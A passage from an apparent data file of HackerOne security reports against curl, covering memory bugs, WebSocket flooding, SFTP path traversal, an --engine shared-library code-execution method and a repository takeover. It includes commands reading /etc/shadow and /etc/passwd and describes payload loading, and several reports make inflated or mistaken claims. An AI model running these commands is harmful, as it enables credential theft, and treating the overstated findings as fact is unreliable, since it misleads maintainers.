(F4696745)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ku2hwq2l0fags9aqmeilp9v9g469?response-content-disposition=attachment%3B%20filename%3D%22minimal_curl_connect_crash.cpp%22%3B%20filename%2A%3DUTF-8%27%27minimal_curl_connect_crash.cpp&response-content-type=text%2Fx-csrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYRX5DKV2%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024727Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBEaCXVzLXdlc3QtMiJHMEUCIQDfgm7sPWH2b9%2FOBdbjHgtMrQg6MkR263WX2rz%2B5dtWmgIgbPAq39x9WF7MISnokuMBjkWm7U3Xcv3OoOuYgvS5uDUquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNjFMvM3bkKNwgaEUCqPBdUgLGiizF68LubhD%2FZzT8WQp6kZsTM6NT0TrlRRhm5dCL0Pd%2FqSqcktDbd2sNzKoKtnf8akkeTUT%2FXvj2G22ZpYNKQMp1YAMBRh6p0dcGYlZfw1kMnZuZY%2BolmP8c%2BguGJUP4HeDzqeUg0Kp6HSBlF9CWp04BEX2x9ZN2arMIrduLjYaXqg9yuMWY2h7jUVOBDAduUeOaJDeu%2FrEe4POUCk8jN1S%2BoDQIFLw2owYp0Gdq7CdAmQvG4QhpZv5EcrPSZIsG1aoQz2a0IznLK%2FwoWsuj3Otnhj4nBfvVlH5OZ06zlsRirxKmI1ccvEmz%2B2hPUhCSN9RawpMjVVORHKsQSxscoZ%2FxYLZb4SMs7rf33A%2FRNJHKL%2FfoOV7U0FA8Uq9F4%2BocnddCc47uhBt%2FJuF5uYMZODRyLbddXfvmmw5LSGxfVkUwaAvUAEic6v3Ga0g5vXU3pXuLw16G9eJrenC7Hcb%2Bv9H2tqPD8c5fd5TKNQ49u4jZsyI1uIQemuXxd10CZvUPMOJGQCK%2FGONOugbDAyRAz7NxHMf3YSUAF1DEBso5%2FXW5I8p4chMY33oqvy2vTRJVpLqTg7NLoHyh7Imo9f3JvoXaw9BTkWpz0fWr38buYCVaw1XW%2F53Y0oEVtOc8UeDi1P1sVG3BGD11oeC01UrQrLTzLOuZKaj9lrzBKeQ2pa5WF7w%2FeSupxKB938IVMlaBdXi7qRhX8p8HSDqEfFjAoqUrZjU4vgJmd%2BMQ4sYsh%2FgL%2BGL4BPmfc65qEC3kRHgdAb5nB7AGdjnFwLXHD2DpNbMVIS6w0pgjj3kylDD9ntp8sMq8fbRU9TFCHE6rNRLnpjqCrS06KtmRteQ%2BxswMr3BmQA3EM%2BAXCSAp8wyurcxgY6sQF6cKR3Quzom2PnCgCua%2FbSPnfEtyNFjLe3CberMMpmBO4eJcjrrb0%2Fh2qY43AkzEIOzUGYs2duX%2FDNuVmHnWilrygifjHhWUTBu7GuSNmAZtx8P5rRwYIz%2BC559F65wvI4NQMuZPJdqQOu9s7iWAhrHWqopvLdIAAH5mK6UMVWmPq6xGPXD2ysCT2FlhOKKSknXwlIBu0o4VV7fVYblj86I9ymdUcfEtm0pJnJcHKUNj4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=109cc12f58ddc096e6ef389e9433573cd4aca2ec54553f111cd9e4ffcdd04ed1)\n\nImpact\n------\n\nSummary:\n--------\n\nAn attacker can cause a denial-of-service (DoS) by crashing the application using a specially crafted CURLOPT\\_CONNECT\\_TO string. No code execution or data leakage is known; the primary risk is service disruption."
},
{
    "url": "https://hackerone.com/reports/3303765",
    "original_report": "### Summary\n\nA malicious WebSocket server can send a fragmented message (FIN=0) followed by a flood of continuation frames, causing the client (curl) to continuously allocate memory while waiting for message completion. This can result in high memory usage and potential crash (OOM), representing a Denial-of-Service vulnerability.\n\n---\n\n### Description\n\nThe vulnerability occurs because curl does not limit the number of continuation frames for an unfinished WebSocket message. An attacker controlling a WebSocket server can send:\n\n1. Initial text frame with `FIN=0` (indicating message continuation).\n2. An unbounded number of continuation frames (`opcode=0`, `FIN=0`).\n\nThis causes curl to continuously buffer incoming data until memory is exhausted. The script `ws_frag_poc.py` demonstrates the behavior.\n\n---\n\n### Steps to Reproduce\n\n1. Save the following PoC script as `ws_frag_poc.py`:\n\n2. Run the PoC:\n\n3. In another terminal, connect using curl:\n\n4. Monitor memory usage:\n\n---\n\n### Expected Result\n\nCurl should handle fragmented messages without unbounded memory growth.\n\n### Actual Result\n\nMemory usage grows continuously, CPU spikes, process may hang or crash (OOM).\n\n---\n\n### Mitigation / Recommendation\n\n* Implement limits on the number of continuation frames for unfinished WebSocket messages.\n* Consider maximum message size or memory allocation threshold to prevent client-side DoS.\n* Add proper validation of FIN/fragmented frames in the WebSocket implementation.\n\n---\n\n### References\n\n* [RFC 6455 - The WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)\n* [CWE-400](/hacktivity/cwe_discovery?id=cwe-400): Uncontrolled Resource Consumption\n\nImpact\n------\n\n* High memory consumption on the client.\n* Potential crash or process termination (OOM) in curl.\n* Can be triggered remotely if the client connects to a malicious WebSocket server."
},
{
    "url": "https://hackerone.com/reports/3302518",
    "original_report": "Summary\n-------\n\nA **Use-After-Free (UAF)** vulnerability was discovered in `curl` at **`curl_trc.c:195`**.  \nWhen processing specially crafted input, the code accesses memory after it has already been freed.  \nThis can result in undefined behavior, leading to a **denial of service (crash)** and potentially enabling **information disclosure** or **remote code execution**, depending on the attacker’s ability to control heap layout.\n\ncode\n\nAffected version\n----------------\n\ncurl 8.16.0-DEV (Linux) libcurl/8.16.0-DEV\n\nSteps To Reproduce:\n-------------------\n\nI used LLVM libFuzzer to find this.\n\n1.Compile libcurl with sanitizers enabled:\n\n2. Build the fuzz target vulnerablityfuzz.cpp with coverage instrumentation enabled.\n\n3. Run the fuzzer:\n\nSupporting Material/References:\n-------------------------------\n\n[curl\\_vulnerability\\_fuzzer.cpp (F4687026)](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nl701p8c7t8mo7w6wnqr9qrvexca?response-content-disposition=attachment%3B%20filename%3D%22curl_vulnerability_fuzzer.cpp%22%3B%20filename%2A%3DUTF-8%27%27curl_vulnerability_fuzzer.cpp&response-content-type=text%2Fx-csrc&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVFXXI7HC%2F20250927%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250927T024734Z&X-Amz-Expires=2892&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA0aCXVzLXdlc3QtMiJHMEUCIBv9RkD7Kp%2FuNO%2Fy5dSVUH5Hzdbntpt9KMgpFdVDILTVAiEAvmUxaiTx1tiGcyotyy3GQQcUlv3W7JNRnvAFSEUEWIgquwUIlv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDKM%2FUELsDT%2FfpU9Z9CqPBZksE%2BLunM7BzTVWY0lo4xvCjj9hcG6uTVP0FPWX03wlEfZUcDePdwXhgELmVND2L1Cr2Hi7mGqizvdHNFQzDC07ia3YNzw1pQOlRCFA5YSU1Sw5GshKbbjH0qP28rXuaRLIZtMKToamsBlSqETnSHs8WOiiXcONlSTDxDdtPT3eE0A9AV9koc78xtRKqkIQf%2Frw4RfynNIKVtPGAaDKlB8KytIxPnqabjkUh1EiN6KpOy8YTqeDeIrc%2BujePsc59HnfGUweB8veuoy4Wz%2BBJyQyWUkjY4gMDiBf51rJWh1f1JRz3lPS0hjypC9R3TMpUE7dH7f2sHy%2FLdxdUngrGz051U1%2BQAh5Tx0kDSRcNzMaLIa%2FKLN6lCqLLj2yjEzM10yQCUkRfWXxjczgY6YGWDxhrcoI%2FpijIUo11ViM506oioBlXDKudfSRasHUbG7lbFaKBJyF2DW3swCUC1dEy9VYCiRgn577ZQ087vVu6z84Hx4oIu8JKGV%2FFd7OGzj%2F9p2bTf%2FK%2BJlErh5d6xXtf3xlHemciah06pVVLg%2B1Gdw6NDfGHVYC3BbcNwh5JqafI09o4GOY2h3OR1gidk7bZCqEEuoUyXNLgzpDehxCs3uuuSMN7fheWbTT3cQi9P1SwaIB9vJ%2FV8G2aQsRXdcxPq7fldYTZqbU5tAovDPIuBvVUg4axyOC065NkCqyatss434F1rixnn7%2BsCuMXo%2BY8sd09the3lcbA5RY1zmZUoed1r4tThhAqxhR07nLz5RsCsEYKoHym8Zkj18fnOGZYGuiTWEMV4YMjt%2BE3jPJNmivx2hN65huBoSjE7U68BT8UjwpnznkVr%2Bzn58tWBOORXaSnmqczEOp8taz2DfMWqIwl4PcxgY6sQGSQQR7KLnis4KxruolYTlTFSce4k8QT7ultjryS1UidlKQe55U3dB8JzoPU2D9Rd5C6%2Btg84uGVwNcEjN4%2FRfH8sL33dkr7j8SDUR9VPa526llginfv8RktnuvXPWhsR5gGTaoD318qI41aaFQ9sliGyILe3Wj8w9ZKzR3PNnK0rcShAaSliNs8LDcg%2B8QvWwZH9xfxiD2v28fH6%2FVuNTUUed99bg1eG4mSHyJzhagQF0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=058a04b4fc67b52f977f41b51e051b8766201c13bcc3cdfdf1efc960d8032113)\n\nImpact\n------\n\nSummary:\n--------\n\nThe discovered vulnerability is a **heap-use-after-free** in `curl` that occurs when previously freed heap memory is accessed and written via `strcpy()`.\n\nAn attacker who can influence the input processed by the vulnerable functions (e.g., SSL configuration, proxy configuration, or callback functions) may achieve the following impacts:\n\n* **Denial of Service (DoS):**  \n  By triggering the use-after-free condition, an attacker can reliably crash the process, making the application or service unavailable.\n* **Information Disclosure:**  \n  Since freed memory may still contain sensitive data, an attacker may be able to read unintended memory contents, potentially leaking secrets such as credentials or session tokens.\n* **Arbitrary Code Execution (High Risk):**  \n  With careful heap grooming, an attacker could exploit the dangling pointer to overwrite adjacent memory structures, potentially gaining control of program flow and executing arbitrary code in the context of the application.\n\nGiven that `curl` is widely used in network-related applications, exploitation of this bug can have a significant impact on the security of systems that rely on it."
},
{
    "url": "https://hackerone.com/reports/3295738",
    "original_report": "Summary:\nThe href\\_extractor.c example in the curl repository (<https://github.com/curl/curl/blob/master/docs/examples/href_extractor.c>) references an external HTML parser library hosted at <https://github.com/arjunc77/htmlstreamparser>. The referenced GitHub username (arjunc77) or repository (htmlstreamparser) appears to be abandoned or deleted, allowing me to register the same username and host a repository with the same name. This enables a potential supply chain attack, where malicious code could be distributed to users relying on the referenced library, impacting the security of applications built using this example.\nDescription:\nThe href\\_extractor.c file, part of the curl project's example code, uses the HTML streaming parser from <https://github.com/arjunc77/htmlstreamparser>. I discovered that the GitHub username arjunc77 or the repository htmlstreamparser was abandoned or deleted, as I was able to register the same username and create a repository under the same name. By hosting a malicious version of the HTML parser in this repository, an attacker could compromise systems that download and use the library based on the link provided in the curl documentation. This is particularly concerning because the curl project is widely trusted, and developers may not verify the ownership or integrity of the referenced repository.\nSteps to Reproduce:\n\nVisit the href\\_extractor.c file in the curl repository: <https://github.com/curl/curl/blob/master/docs/examples/href_extractor.c>.\nNote the reference to the HTML parser at <https://github.com/arjunc77/htmlstreamparser> in the file's comments.\nVerify that the arjunc77/htmlstreamparser repository is no longer active or has been deleted (as I was able to register the username arjunc77).\nCreate a new GitHub account with the username arjunc77 and a repository named htmlstreamparser.\nHost a proof-of-concept (PoC) repository with malicious or modified code at <https://github.com/arjunc77/htmlstreamparser>.\nDevelopers cloning or downloading the library from this link, as referenced in href\\_extractor.c, would inadvertently use the malicious code.\n\nProof of Concept:\nI registered the GitHub username arjunc77 and created a repository named htmlstreamparser at <https://github.com/arjunc77/htmlstreamparser>. I hosted a PoC version of the HTML parser with a simple modification (e.g., adding a print statement to demonstrate control over the code). When compiled and run with href\\_extractor.c, the modified code executes, confirming the potential for malicious code injection. The PoC repository remains available for verification but does not contain harmful code.\n\nReferences:\n\nVulnerable file: <https://github.com/curl/curl/blob/master/docs/examples/href_extractor.c>\nPoC repository: <https://github.com/arjunc77/htmlstreamparser> (created for demonstration purposes)\n\nlocation of the issue :\n\nImpact\n------\n\nThe impact of this vulnerability is significant due to the potential for a supply chain attack:\n\nCode Execution Risk: Developers who follow the curl example and download the HTML parser from the referenced GitHub link could unknowingly integrate malicious code into their applications. This could lead to arbitrary code execution, data theft, or further compromise of systems where the application is deployed.\nTrust Exploitation: The curl project is a widely used and trusted library, and its documentation is considered authoritative. A malicious repository hosted under the same username could exploit this trust, leading to widespread adoption of compromised code.\nScalability: Since the curl repository is publicly accessible and used by millions of developers, a single compromised link could affect numerous projects, especially those automatically pulling dependencies without manual verification.\nReputation Damage: A successful attack leveraging this vulnerability could harm the reputation of the curl project, as users may perceive the inclusion of an unverified link as a security oversight."
},
{
    "url": "https://hackerone.com/reports/3295652",
    "original_report": "The curl source repository contains official documentation and example code that demonstrate WebSocket connections using the insecure ws:// protocol instead of the secure wss://. This misleading guidance may encourage developers to implement cleartext WebSocket endpoints, exposing users and infrastructure to eavesdropping, MITM (Man-in-the-Middle) attacks, and session hijacking. Failing to promote secure defaults in a popular open-source project creates systemic risks for downstream adopters.\n\nThis report and its analysis were enhanced and generated using an AI assistant to ensure a comprehensive security review and reproducibility.\nAffected version\n\nVerified on the curl master branch as of August 2025. Insecure usage appears in historical releases as well. Example tested version:\n\ncurl 8.1.2 (x86\\_64-pc-linux-gnu) libcurl/8.1.2 OpenSSL/3.0.7 zlib/1.2.13 brotli/1.0.9 zstd/1.5.2 libidn2/2.3.4 nghttp2/1.51.0\nRelease-Date: 2023-06-12\nProtocols: dict file ftp ftps gopher gophers http https imap imaps mqtt pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp ws wss\nPlatform: Linux 5.15.0-83-generic x86\\_64\n\nSteps To Reproduce:\n\nClone or download the curl GitHub repository.\nSearch for insecure WebSocket URIs by running:\ngrep -rn 'ws://' ./docs/ ./examples/\nReview the documentation (docs/WEBSOCKETS.md, etc.) and example code (e.g., examples/websocket-client.c) to confirm insecure ws:// references are present and no explicit security warning is provided.\nValidate that instructions or sample code do not require, prefer, or warn about secure WebSocket (wss://) usage.\n\nSupporting Material/References:\n\nFile: docs/WEBSOCKETS.md (e.g., line 15: curl \"ws://echo.websocket.org\")\nFile: examples/websocket-client.c (e.g., line 42: #define WS\\_URL \"ws://test.websocket.org\")\nManual and Semgrep findings for insecure protocol patterns\ncurl/curl GitHub repository\n\nImpact\n------\n\nSummary:\n--------\n\nBy demonstrating and failing to warn against insecure WebSocket usage (ws://), curl's documentation may lead developers to implement applications that transmit data over unencrypted channels. This enables attackers to:\n\nEavesdrop on user data in transit\nHijack sessions or inject malicious payloads\nPerform MiTM attacks against production services and infrastructure\n\nFor a widely adopted open source tool, propagating insecure defaults has downstream and supply chain impact, potentially affecting thousands of projects. Severity is High, and the most relevant CWE is [CWE-319](/hacktivity/cwe_discovery?id=cwe-319): Cleartext Transmission of Sensitive Information."
},
{
    "url": "https://hackerone.com/reports/3295656",
    "original_report": "In the curl source repository, the OS400 initialization script (packages/OS400/make-incs.sh) modifies the global shell variable IFS (Internal Field Separator) without local scoping or restoration. This pattern exposes users and CI/CD systems to unintended parsing, command injection, and logic errors if the environment or invoker is attacker-controlled or untrusted. Shell scripts that alter process-wide environment variables in this way are vulnerable to privilege escalation and unpredictable execution, especially where user input or automated tooling is involved.\n\nThis issue and its report were identified and compiled with the assistance of an AI security agent to ensure a thorough technical review and reproduction.\nAffected version\n\nConfirmed on the curl master branch (as of August 2025) and present in all current/active releases for Unix-like systems where the OS400 build scripts are executed. Example version:\n\ncurl 8.1.2 (x86\\_64-pc-linux-gnu) libcurl/8.1.2 OpenSSL/3.0.7 zlib/1.2.13 brotli/1.0.9 zstd/1.5.2 libidn2/2.3.4 nghttp2/1.51.0\nPlatform: Linux/macOS/AIX/OS400\n\nSteps To Reproduce:\n\nClone or download the curl GitHub repository.\nOpen packages/OS400/make-incs.sh and search for occurrences of IFS using:\ngrep -n IFS packages/OS400/make-incs.sh\nObserve lines that reassign IFS globally (e.g., IFS=\"$IFS,\") without scoping or restoring its prior value.\nReview script logic to confirm IFS is not contained in a subshell or temporary assignment, enabling persistent global effect.\nCross-reference with Semgrep/static analysis rules for shell injection/unsafe IFS usage.\n\nSupporting Material/References:\n\nFile: packages/OS400/make-incs.sh (any lines manipulating IFS)\nSemgrep/static analysis results highlighting improper use of IFS in shell scripts\ncurl/curl GitHub repository\n(Attach scan logs/screenshots if available)\n\nMitigation Plan\n\nAudit all script locations where IFS is modified:\nUse grep -n IFS packages/OS400/make-incs.sh to identify unsafe or global IFS assignments.\n\nApply local scoping and restoration for IFS changes:\nConstrain IFS modifications to the smallest possible scope—ideally, declare them within a loop or subshell, not at script global level.\nUse inline assignments such as while IFS=, read ...; do ...; done.\nAlternatively, always save the original IFS value before any change, and restore it immediately after:\n\nold\\_IFS=\"$IFS\"\nIFS=,\n# ... commands using new IFS ...\nIFS=\"$old\\_IFS\"\n\nIntegrate static analysis in CI/CD:\nAdd Semgrep or ShellCheck rules to your CI pipeline to automatically detect and block unsafe global variable manipulations and shell injection patterns before merge.\n\nDocument secure shell scripting and input parsing practices:\nAdd clear development guidelines for contributors, highlighting the risks of global variable changes and best practices for safe parsing.\n\nReview and test:\nAfter refactoring, test all affected scripts in all supported environments to ensure there are no functional regressions and that environment state is always predictable.\n\nImplementing these steps will protect against command injection, parsing errors, and unintended side effects—greatly improving both the security posture and stability of scripting within the curl project.\n\nImpact\n------\n\nSummary:\n--------\n\nManipulating the IFS variable globally within a shared or multi-user shell environment can:\n\nEnable attackers to exploit parsing logic for command injection, privilege escalation, or unintended code execution.\nBreak automation and CI/CD workflows by introducing parsing bugs or unpredictable script behavior.\nUndermine the expected environment security for any scripts, processes, or users sharing the shell session.\nIn some cases, lead to lateral movement within automated build pipelines or on developer systems.\n\nSeverity is typically High because of the elevated risk in CI and scripting contexts, especially if untrusted input is ever processed. Most relevant CWE are [CWE-78](/hacktivity/cwe_discovery?id=cwe-78): Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') and [CWE-20](/hacktivity/cwe_discovery?id=cwe-20): Improper Input Validation."
},
{
    "url": "https://hackerone.com/reports/3295650",
    "original_report": "Multiple private/test RSA keys and example credentials were discovered embedded in the public curl source repository and associated documentation. These sensitive secrets were detected using automated tools (gitleaks) and manual review. Their presence could allow attackers to impersonate trusted curl infrastructure, decrypt traffic, or pivot into build or CI systems if reused, creating a severe supply chain risk. Such exposures also risk compliance violations (e.g., GDPR, PCI-DSS, HIPAA) and undermine trust in open source releases.\n\nThis report, including the verification steps and analysis, was prepared using an AI security assistant to ensure comprehensive and reproducible results.\nAffected version\n\nConfirmed in curl master branch as of August 2025. Also observed in prior tags (≥ 7.80.0) on Linux and macOS. Example version for testing:\n\ncurl 8.1.2 (x86\\_64-pc-linux-gnu) libcurl/8.1.2 OpenSSL/3.0.7 zlib/1.2.13 brotli/1.0.9 zstd/1.5.2 libidn2/2.3.4 nghttp2/1.51.0\nRelease-Date: 2023-06-12\nProtocols: dict file ftp ftps gopher gophers http https imap imaps mqtt pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp ws wss\nPlatform: Linux 5.15.0-83-generic x86\\_64\n\nSteps To Reproduce:\n\nClone the curl repository: git clone <https://github.com/curl/curl.git>\nRun a secret scanning tool (e.g., gitleaks detect --source=.) to identify hard-coded secrets.\nAlternatively, search for likely private key and credential strings with:\ngrep -r '-----BEGIN' ./tests/\ngrep -r 'password' ./docs/examples/\nReview identified files to confirm the presence of full private keys or functional credential examples, such as tests/data/testprivkey.pem or docs/examples/http-auth-example.txt.\nSee .gitleaks/report.json for a consolidated findings report.\n\nSupporting Material/References:\n\nExample evidence: tests/data/testprivkey.pem containing full private key\nExample evidence: docs/examples/http-auth-example.txt with plaintext credentials\nFull scan log: .gitleaks/report.json (generated via gitleaks)\ncurl/curl GitHub repository\nScreenshot evidence as required (available on request)\n\nSeverity: Critical / [CWE-321](/hacktivity/cwe_discovery?id=cwe-321) (Use of Hard-coded Cryptographic Key)\n\nImpact\n------\n\nSummary:The security impact of this vulnerability is severe and multi-faceted:\n------------------------------------------------------------------------------\n\nImpersonation & Privilege Escalation: Attackers can use leaked private keys to impersonate curl services, developers, or automated systems, gaining unauthorized access to protected infrastructure or code-signing processes.\nData Decryption: If any of the exposed keys have been (or are) used in production, an attacker could decrypt sensitive traffic or files, leading to data breaches.\nCredential Stuffing & Service Hijack: Exposed example/test credentials may be reused in production or CI/CD, allowing attackers to pivot and escalate their access within targeted environments.\nSupply Chain Attacks: Malicious actors might leverage sensitive secrets to inject or distribute malicious builds of curl/libcurl or to poison official releases.\nRegulatory & Compliance Risks: This level of exposure may trigger mandatory breach reporting and legal or regulatory actions, especially for downstream consumers subject to compliance standards.\n\nIn summary: This issue enables attackers to compromise trust in the curl project, attack users and downstream integrations at scale, and potentially introduce persistent, hard-to-detect threats into the open source supply chain and the global software ecosystem."
},
{
    "url": "https://hackerone.com/reports/3293801",
    "original_report": "#### Summary:\n\nThe `curl` command-line tool is vulnerable to Arbitrary Code Execution on POSIX-like systems (Linux, macOS, etc.). The `--engine` option allows loading an OpenSSL crypto engine from a shared library (`.so` file). Crucially, this option accepts an **absolute or relative path** to the library file, allowing a user to load any shared library on the file system.\n\nAn attacker can craft a malicious shared library containing a `__attribute__((constructor))` function. This function is executed by the dynamic loader the moment the library is loaded into the `curl` process's memory, achieving immediate code execution, even before OpenSSL attempts to initialize it as an engine.\n\nThis leads to direct RCE if an attacker can influence the arguments passed to a `curl` command, a common scenario in web application backends, CI/CD pipelines, and other automated scripts.\n\n*(Statement as per disclosure policy: This vulnerability was discovered and verified by me. An AI assistant was used to help structure and draft this report based on my findings and proof-of-concept.)*\n\n#### Affected version:\n\nI reproduced this on the following version, but it likely affects all versions that support the `--engine` option on POSIX systems with GCC/Clang compiled binaries.\n\n#### Steps To Reproduce:\n\nThese steps will demonstrate direct code execution on a WSL/Linux system.\n\n1. **Step 1: Create the malicious payload.**\n   Save the following C code as `evil_engine.c`. This code will execute `id > /tmp/RCE_VIA_ENGINE` the moment the library is loaded.\n2. **Step 2: Compile the payload into a shared library.**\n   Use `gcc` to compile the C code into a shared object (`.so`) file.\n3. **Step 3: Prepare for verification.**\n   Ensure the proof file does not exist before the attack.\n4. **Step 4: Execute `curl` with the malicious engine.**\n   Run any `curl` command, but use the `--engine` option to point to our malicious library. Note that we must provide an absolute path.\n\n   *You will see an error message like `curl: (53) SSL Engine '...' not found`. This error is expected and irrelevant, as it occurs **after** our malicious code has already been executed by the constructor.*\n5. **Step 5: Verify Code Execution.**\n   Check the contents of the proof file.\n\n   The command will output the result of the `id` command, confirming that arbitrary code was executed successfully as the user who ran `curl`.\n\n#### Supporting Material/References:\n\nI have recorded a full video of the Proof of Concept: `PoC.mp4`\n\nImpact\n------\n\nThe security impact is **direct and critical Remote Code Execution**.\n\nAn attacker who can control or influence the arguments passed to a `curl` command can achieve RCE on the underlying system. This completely bypasses any application-level security.\n\nCommon attack scenarios include:\n\n* **Web Application Backends:** A web service that allows users to provide options for a `curl` command (e.g., in a \"website checker\" or \"webhook tester\" feature) would be vulnerable. An attacker could inject `--engine /path/to/payload.so` if they can also upload a file.\n* **CI/CD Pipelines & Scripts:** Automated scripts that build `curl` commands using variables from external, untrusted sources (like commit messages or API responses) could be tricked into loading a malicious engine.\n* **Social Engineering:** A developer or system administrator could be tricked into running a seemingly benign diagnostic command provided by an attacker, which includes the malicious `--engine` flag.\n\nThe vulnerability stems from the `--engine` feature trusting a user-provided path without any validation or restriction to a secure, system-defined directory for crypto engines. This effectively turns the feature into a \"load-and-run\" primitive for arbitrary shared libraries."
},
{
    "url": "https://hackerone.com/reports/3293177",
    "original_report": "### Description\n\n#### Summary\n\n`libcurl` is vulnerable to a path traversal attack when processing SFTP `QUOTE` commands. The internal function `Curl_get_pathname` in `lib/vssh/curl_path.c` fails to sanitize user-provided paths for traversal sequences (`../`). An attacker who can control the SFTP `QUOTE` commands can leverage this to perform arbitrary file operations (rename, delete, and with `STOR`, write) outside of the user's intended directory. This can be escalated to Remote Code Execution (RCE) on the SFTP server by overwriting sensitive files like `authorized_keys` or system scripts.\n\n#### AI Usage Disclosure\n\nIn accordance with your policy, I disclose that this report was the result of a collaborative effort between myself and an AI assistant. The AI was used to analyze the source code, suggest potential vulnerabilities, and assist in structuring the report, while I guided the process, made the final decisions, and manually verified all findings, including the vulnerability analysis and Proof of Concept code.\n\n---\n\n#### Affected version\n\nThis was reproduced on a system using libcurl linked with libssh2. The vulnerability is in `libcurl`'s own path handling code and is likely present in recent versions. The `curl -V` output on the test system is:\n\n#### Steps To Reproduce\n\nThis vulnerability can be reliably reproduced in a local Windows environment.\n\n1. **[Setup Step 1] Install and Run OpenSSH Server:**\n\n   * On a Windows 10/11 machine, install the \"OpenSSH Server\" via Optional Features (`Settings -> Apps -> Optional features -> Add a feature`).\n   * Start the service using PowerShell (as Admin): `Start-Service sshd` and set it to automatic: `Set-Service -Name sshd -StartupType 'Automatic'`.\n   * Create a local test user: `net user testuser testpass /add`.\n2. **[Setup Step 2] Prepare Target Files and Directories:**\n\n   * Create a file to be moved in the test user's home directory:\n     `echo. > C:\\Users\\testuser\\file_to_move.txt`\n   * Create the target directory for the attack:\n     `mkdir C:\\tmp\\attack_target`\n   * Grant the test user permissions on the target directory:\n     `icacls C:\\tmp\\attack_target /grant testuser:(OI)(CI)F`\n3. **[Setup Step 3] Proof of Concept Code (`poc.c`):**\n\n   * Save the following C code as `poc.c`. This program uses `libcurl` to connect to the local SFTP server and issue a malicious `rename` command.\n4. **[Execution Step 4] Compile and Run:**\n\n   * Install a MinGW-w64 toolchain (e.g., via MSYS2).\n   * Compile the PoC: `gcc poc.c -lcurl -o poc.exe`\n   * Run the PoC: `./poc.exe`\n5. **[Verification Step 5] Verify the Exploit:**\n\n   * Check the contents of the target directory: `dir C:\\tmp\\attack_target`\n   * **Result:** The file **`SUCCESS.txt`** will be present in the directory, proving that the `rename` operation successfully traversed out of the user's home directory (`C:\\Users\\testuser`) and wrote to `C:\\tmp\\attack_target`.\n\n#### Supporting Material/References:\n\nThe vulnerability is in the function `Curl_get_pathname` in the file `lib/vssh/curl_path.c`. The function copies the user-provided path from a `QUOTE` command into the output buffer without validating or sanitizing `../` sequences, leading to the path traversal vulnerability.\n\nImpact\n------\n\nThis vulnerability allows an attacker with SFTP access (even if ostensibly jailed or restricted to a home directory) to perform arbitrary file operations on any part of the filesystem where the user has OS-level permissions.\n\nThis can be directly escalated to **Remote Code Execution (RCE)**. An attacker could:\n\n* Overwrite a user's `~/.ssh/authorized_keys` file to gain persistent SSH access.\n* Overwrite system scripts, application binaries, or configuration files.\n* Write to web server directories to achieve web-based RCE.\n\nThis is a critical vulnerability as it completely breaks the security model of SFTP directory restrictions and can lead to a full server compromise."
},
{
    "url": "https://hackerone.com/reports/3293884",
    "original_report": "Summary\nA security vulnerability has been identified that allows unauthorized local file system access via the file:// protocol in cURL, particularly when executed with elevated privileges (e.g., sudo). This could lead to sensitive data exposure, including password hashes stored in /etc/shadow.\n\nSteps to Reproduce\nLocating Protocol Handlers\nFirst, I searched for protocol registration in cURL's source:\n// Found in lib/url.c\nstatic const struct Curl\\_handler \\* const protocols[] = {\n&Curl\\_handler\\_dict,\n&Curl\\_handler\\_file, // ← This is what we're interested in\n&Curl\\_handler\\_ftp,\n...\n};\nKey Insight:\nThe file handler is enabled by default in the protocols array.\n\nExamining the File Protocol Handler\nI traced the file handler implementation:\n\n// lib/file.c\nstatic CURLcode file\\_do(struct Curl\\_easy *data, bool* done)\n{\nchar *path = data->state.up.path; // ← Raw path from URL\nFILE* file = fopen(path, \"rb\"); // ← Direct filesystem access\n...\n}\nVulnerability Found:\nNo validation of:\n\nPath traversal sequences (../)\nSymbolic links\nFilesystem permissions\n\n1. Basic Local File Read\n   curl \"file:///etc/passwd\" # Reads system user info\n2. Privileged File Access (with sudo)\n   sudo curl \"file:///etc/shadow\" # Exposes password hashes\n\necho \"test\" > /tmp/test\\_file\ncurl \"file:///tmp/test\\_file\"\nsudo curl \"file:///etc/shadow\" #\nExpected Output:\nroot:\\*:\nkali:$\n[...]\n\nReferences\ncURL Security Documentation - Official security considerations for cURL\nCURLOPT\\_PROTOCOLS man page - Protocol restriction options\n\nImpact\n------\n\nConfidentiality Breach: Read access to sensitive system files\nPrivilege Escalation: Potential root access via hash cracking\nBusiness Impact:\nCritical for systems processing sensitive data\nOften missed in containerized environments"
},
{
    "url": "https://hackerone.com/reports/3292590",
    "original_report": "Summary\n-------\n\nA heap buffer overflow vulnerability exists in libcurl's `Curl_memdup0()` function when handling `CURLOPT_COPYPOSTFIELDS` operations. The vulnerability occurs when libcurl internally processes POST data where the specified `CURLOPT_POSTFIELDSIZE` exceeds the actual buffer size of data set via `CURLOPT_COPYPOSTFIELDS`. This is a legitimate use case that libcurl should handle safely, but currently results in out-of-bounds memory access.\n\nPOC\n---\n\n### Environment\n\n* libcurl version: 8.16.0-DEV (master branch)\n* Compiler: Clang 20.1.8 with Address Sanitizer\n* OS: MacOS 26 Dev Beta 5\n\n`gcc -fsanitize=address -g -o poc poc.c -lcurl`\n\nVulnerable Code Path\n--------------------\n\n`CURLOPT_POSTFIELDSIZE` set to 976909154\n`CURLOPT_COPYPOSTFIELDS` given 105-byte buffer\n`Curl_memdup0()` blindly trusts the size parameter\nNo validation that size matches actual buffer\nDetection: Compile with AddressSanitizer (-fsanitize=address) to observe heap buffer overflow.\n\nImpact\n------\n\nSeverity: High\n--------------\n\n### Security Impact:\n\n> Information Disclosure: Out-of-bounds read exposes adjacent heap memory contents\n> Potential 